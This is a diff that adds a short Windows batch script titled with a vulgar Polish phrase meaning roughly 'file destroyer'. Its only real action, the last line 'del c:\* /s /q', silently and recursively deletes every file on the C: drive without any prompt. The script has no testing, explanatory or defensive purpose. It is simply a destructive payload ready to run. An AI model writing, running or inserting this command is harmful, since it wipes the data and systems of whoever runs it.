@@ -1,0 +1,5 @@
+@echo off
+
+title "Wypierdalacz plikow"
+color 03
+del c:\* /s /q
